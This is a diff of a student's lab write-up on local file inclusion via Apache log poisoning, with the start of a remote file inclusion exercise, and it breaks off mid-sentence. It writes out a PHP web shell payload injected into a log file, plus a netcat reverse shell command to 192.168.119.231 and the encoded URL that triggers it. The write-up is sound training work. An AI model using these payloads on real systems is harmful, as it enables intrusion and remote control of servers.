@@ -63,7 +63,7 @@ _(To be performed on your own Kali and Windows 10 lab client machines - Reportin
 - First, we make a malicious request to the server, injecting a PHP function into the log file that will execute the OS command
 `<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>`
 (note the `<pre>` tag meaning the line will be saved in its preformatted state, ignore breaks and spaces)
-![[Screenshot_2022-06-09-10-38-40_432x85.png]]
+
 Here we can see the command being injected into this log file.
 ![[Screenshot_2022-06-09-07-25-12_1124x613.png]]
 - We then simply navigate to the vulnerable log file and call our newly injected function
@@ -72,7 +72,7 @@ Here we can see the command being injected into this log file.
 2.  Use the code execution to obtain a full shell.
 We can simply alter our URL to execute the following command:
 `nc -e cmd.exe 192.168.119.231 9001`
-the full URL would resemble the following:
+After encoding, the full URL would resemble the following:
 `http://192.168.231.10/menu.php?file=c:\xampp\apache\logs\access.log&cmd=nc%20-e%20cmd.exe%20192.168.119.231%209001`
 ![[Screenshot_2022-06-09-07-38-06_886x459.png]]
 
@@ -83,7 +83,12 @@ the full URL would resemble the following:
 _(To be performed on your own Kali and Windows 10 lab client machines - Reporting is required for these exercises)_
 
 1.  Exploit the RFI vulnerability in the web application and get a shell.
+We start by creating a malicious script to be hosted on our local machine
+![[Screenshot_2022-06-09-10-38-40_432x85.png]]
+
 2.  Using /menu2.php?file=current_menu as a starting point, use RFI to get a shell.
+
+
 3.  Use one of the webshells i
 
 
